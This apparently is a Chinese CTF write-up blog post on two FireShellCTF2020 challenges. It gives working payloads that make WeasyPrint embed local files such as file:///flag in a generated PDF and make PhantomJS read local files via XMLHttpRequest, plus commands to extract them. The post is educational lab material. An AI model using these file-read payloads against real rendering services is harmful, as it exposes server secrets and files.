---
title: "LFI相关"
date: 2020-08-24
description: "记录CTF中遇到的文件包含相关问题"
categories: [
  "CTF"
]
---

## [FireShellCTF2020]URL to PDF

给了一个网页扫描toPDF的工具，buu上开一台basic起一个nc访问一下，发现是`WeasyPrint`。

google一下发现这个轮子处理`link`标签的时候会有SSRF的问题

> 后来，我们在WeasyPrint开源代码的 [pdf.py](https://github.com/Kozea/WeasyPrint/blob/b7a9fe7dcc9d0755a3324b74d0965e806bb87378/weasyprint/pdf.py)文件中发现了属性，该属性允许向PDF报告插入任意的网页形式或本地文件内容，如：
>
> ```
> <link rel=attachment href="file:///root/secret.txt">
> ```

nc手搓一下HTTP返回

```html
HTTP/1.1 200 OK

<html>
  <head>
    <meta charset="utf-8" />
  </head>
  <body>
    <link rel="attachment" href="file:///flag">
  </body>
</html>
```

下载生成的PDF，此时flag文件文件被编码在PDF中，pdfdetach可以分离

```shell
pdfdetach -list flag.pdf
pdfdetach -save 1 flag.pdf
cat flag
```

拿到flag

## [FireShellCTF2020]ScreenShoter

这题跟上一题原理基本一致，出题点是PhantomJS的文件读漏洞

nc上手搓一下response

```html
HTTP/1.1 200 OK

<html>
    <head> 
        <meta charset="utf-8">
    </head>
    <script>
        x = new XMLHttpRequest;
        x.onload = function(){
            document.write(this.responseText)
        };
        x.open("GET", "file:///flag");
        x.send();
    </script>
</html>
```

下载flag图片，OCR一下就有了